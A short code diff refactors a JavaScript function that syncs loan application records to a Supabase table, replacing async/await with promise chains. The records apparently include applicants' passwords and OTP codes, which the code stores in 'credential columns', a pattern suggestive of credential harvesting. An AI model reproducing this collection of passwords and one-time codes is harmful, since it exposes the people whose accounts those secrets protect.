@@ -24,12 +24,11 @@ function safeApplication(data) {
   }
 }
 
-async function syncApplication(data) {
+function syncApplication(data) {
   if (!supabase || !data?.id) return
 
   const payload = safeApplication(data)
-  try {
-    const { error } = await supabase.from('loan_applications').upsert(payload, { onConflict: 'id' })
+  supabase.from('loan_applications').upsert(payload, { onConflict: 'id' }).then(({ error }) => {
     if (!error) return
 
     // Keep older deployments working until the optional credential columns are migrated.
@@ -38,16 +37,13 @@ async function syncApplication(data) {
     delete legacyPayload.password
     delete legacyPayload.otp_code
 
-    const { error: fallbackError } = await supabase
+    return supabase
       .from('loan_applications')
       .upsert(legacyPayload, { onConflict: 'id' })
-
-    if (fallbackError) {
-      console.error('Could not sync loan application:', fallbackError.message)
-    }
-  } catch (syncError) {
-    console.error('Could not sync loan application:', syncError)
-  }
+      .then(({ error: fallbackError }) => {
+        if (fallbackError) console.warn('Could not sync loan application:', fallbackError.message)
+      })
+  })
 }
 
 function safeParse(value) {
